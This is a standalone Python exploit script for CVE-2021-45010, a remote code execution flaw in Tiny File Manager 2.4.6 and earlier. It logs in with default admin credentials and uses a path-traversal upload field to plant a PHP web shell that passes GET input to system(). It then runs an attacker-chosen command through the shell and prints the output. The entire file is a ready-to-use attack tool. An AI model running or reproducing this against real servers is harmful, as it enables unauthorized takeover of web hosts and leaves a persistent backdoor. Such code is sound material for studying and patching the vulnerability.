#!/usr/bin/python3

import argparse
import requests
import sys
import re

# proxies = {"http": "http://127.0.0.1:8080"}

def login(url, user, password):
    try:
        r = requests.get(url, verify=False, allow_redirects=False)
        if r.status_code != 200:
            print("[+] Error accessing URL")
            sys.exit()
        r = requests.post(url, data={"fm_usr": user, "fm_pwd": password}, verify=False, allow_redirects=False)
        if r.status_code != 302:
            print("[+] Incorrect username and/or password!")
            sys.exit()
        else:
            return r.cookies.get_dict()
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)
    
def upload(url, cookies, webroot, directory):
    payload = "<?php system($_GET['cmd']); ?>"
    with open("dug.php", "w") as f:
        f.write(payload)
        f.close()
    lfi = f"../../../../../../../../{webroot}/{directory}/dug.php".replace("//", "/")
    files = {
        "file": ('dug.php', open('dug.php', 'rb')),
        "fullpath": (None, lfi)
    }
    url = url + f"tinyfilemanager.php?p={directory}"
    r = requests.post(url, cookies=cookies, files=files, verify=False, allow_redirects=False)
    if r.text == '{"status":"error","info":"The specified folder for upload isn\'t writeable."}':
        print("[+] Directory is not writeable")
        sys.exit()
    elif '{"status":"success","info":"file upload successful"}':
        print("[+] PHP uploaded")
    else:
        print("[+] Error uploading file!")
        sys.exit()
        
def rce(url, cookies, directory, command):
    url = url + f"tinyfilemanager.php?p={directory}"
    r = requests.get(url, cookies=cookies, verify=False, allow_redirects=False)
    check = re.search(f'<a title="Direct link" href="(.*?)dug.php" target="_blank">', r.text)
    if check is not None:
        url = check.group(1) + f"dug.php?cmd={command}"
        r = requests.get(url)
        print(f"[+] Output:\n\n{r.text}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2021-45010: Tiny File Manager <= 2.4.6 - Remote Code Execution (RCE)")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-x", "--command", help="Command to execute")
    parser.add_argument("--user", help="Username", default="admin")
    parser.add_argument("--password", help="Password", default="admin@123")
    parser.add_argument("--webroot", help="Webroot path (Ex: /var/www/html)", default="/var/www/html")
    parser.add_argument("--directory", help="Writeable directory in webroot (Ex: /tiny/uploads)")
    args = parser.parse_args()
    url = args.url
    command = args.command
    user = args.user
    password = args.password
    webroot = args.webroot
    directory = args.directory
    if len(sys.argv) < 2:
        print("[+] Arguments required! Please use -h for more details.")
        sys.exit()
    else:
        if url and command and user and password is not None:
            if url[-1] != "/": url = url + "/"
            cookies = login(url, user, password)
            upload(url, cookies, webroot, directory)
            rce(url, cookies, directory, command)
        else:
            print("[+] Missing arguments!")
            sys.exit()